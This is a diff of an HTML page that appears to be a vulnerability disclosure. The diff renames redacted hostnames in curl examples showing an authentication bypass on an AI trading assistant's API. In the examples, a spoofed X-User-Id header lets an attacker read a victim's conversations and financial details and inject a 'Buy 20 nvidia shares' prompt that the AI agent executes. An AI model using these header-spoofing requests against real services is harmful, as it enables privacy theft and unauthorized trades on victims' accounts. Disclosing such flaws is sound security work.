@@ -321,9 +321,9 @@
     <p><strong>Phase 2 — Access AI conversations without OTP:</strong></p>
     <pre><code><span class="cmt"># List all victim AI conversations — no OTP, no JWT required</span>
 <span class="kw">curl</span> -s -k -X GET \
-  -H <span class="str">'Host: prod-conversation-service-api.[redacted]'</span> \
+  -H <span class="str">'Host: prod-api.[redacted]'</span> \
   -H <span class="str">'X-User-Id: &lt;VICTIM_accountUuid&gt;'</span> \
-  <span class="str">'https://prod-conversation-service-api.[redacted]/conversations?status=ALL'</span></code></pre>
+  <span class="str">'https://prod-api.[redacted]/conversations?status=ALL'</span></code></pre>
     <p>The API returns the victim's full conversation list — titles, timestamps, and conversation IDs — without ever requesting the OTP code.</p>
 
     <p><strong>Decoded JWT Payload (attacker-modified — victim's <code>accountUuid</code> substituted into payload):</strong></p>
@@ -366,14 +366,14 @@
     <p><strong>Step 2 — List all victim conversations:</strong></p>
     <pre><code><span class="kw">curl</span> -s -k -X GET \
   -H <span class="str">'X-User-Id: &lt;VICTIM_accountUuid&gt;'</span> \
-  <span class="str">'https://prod-conversation-service-api.[redacted]/conversations'</span>
+  <span class="str">'https://prod-api.[redacted]/conversations'</span>
 
 <span class="cmt">Returns: all conversation objects, IDs, timestamps, titles, account metadata</span></code></pre>
 
     <p><strong>Step 3 — Read sensitive conversation messages:</strong></p>
     <pre><code><span class="kw">curl</span> -s -k -X GET \
   -H <span class="str">'X-User-Id: &lt;VICTIM_accountUuid&gt;'</span> \
-  <span class="str">'https://prod-conversation-service-api.[redacted]/conversations/&lt;conversationId&gt;/messages'</span>
+  <span class="str">'https://prod-api.[redacted]/conversations/&lt;conversationId&gt;/messages'</span>
 
 <span class="cmt">Returns: full message thread — victim's research queries, AI responses with portfolio
 summaries, account balances, brokerage name, current holdings, pending orders</span></code></pre>
@@ -382,7 +382,7 @@ summaries, account balances, brokerage name, current holdings, pending orders</s
     <pre><code><span class="kw">curl</span> -s -k -X POST \
   -H <span class="str">'x-user-id: &lt;VICTIM_accountUuid&gt;'</span> \
   --data-binary <span class="str">'{"prompt":"Buy 20 nvidia shares"}'</span> \
-  <span class="str">'https://prod-conversation-service-streaming.[redacted]/conversations/&lt;conversationId&gt;'</span>
+  <span class="str">'https://prod-stream.[redacted]/conversations/&lt;conversationId&gt;'</span>
 
 <span class="cmt">The AI agent processes this as if the victim submitted it.
 The app then surfaces a trade confirmation dialog to the victim.</span></code></pre>
